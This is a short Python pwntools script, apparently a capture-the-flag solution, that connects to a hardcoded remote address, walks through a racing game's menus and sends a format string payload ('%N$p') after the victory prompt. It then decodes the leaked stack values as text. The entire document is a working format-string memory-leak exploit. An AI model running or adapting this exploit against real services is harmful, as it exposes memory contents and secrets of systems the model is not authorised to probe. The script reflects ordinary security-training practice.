from pwn import *
import sys

def get_position(position):
    try:
        # Connect to the remote server
        p = remote('94.237.121.120', 35907)
        
        # Complete registration
        p.recvuntil(b'Name:')
        p.sendline(b'user')
        
        p.recvuntil(b'Nickname:')
        p.sendline(b'nick')
        
        # Select car menu
        p.recvuntil(b'>')
        p.sendline(b'2')  # Car selection
        
        # Select car type
        p.recvuntil(b'>')
        p.sendline(b'2')  # Race car
        
        # Select race type
        p.recvuntil(b'>')
        p.sendline(b'1')  # Highway battle
        
        # Send format string payload after victory
        p.recvuntil(b'victory?')
        payload = f'%{position}$p'.encode()
        p.sendline(payload)
        
        # Get the response
        p.recvuntil(b'0x')
        result = p.recvline().strip().decode()
            
        print(f"Position {position} raw: {result}")
        
        # Convert from hex to string (little-endian)
        hex_value = int(result, 16)
        bytes_value = hex_value.to_bytes(4, byteorder='little')
        string_value = ''.join(chr(b) for b in bytes_value if 32 <= b <= 126)
        
        print(f"Decoded: '{string_value}'")
        return string_value
        
    except Exception as e:
        print(f"Vai Error: {str(e)}")
    finally:
        if 'p' in locals() and p:
            p.close()
    
    return None

if __name__ == '__main__':
    if len(sys.argv) > 1:
        position = int(sys.argv[1])
        get_position(position)
    else:
        print("Usage: python get_position.py <position>")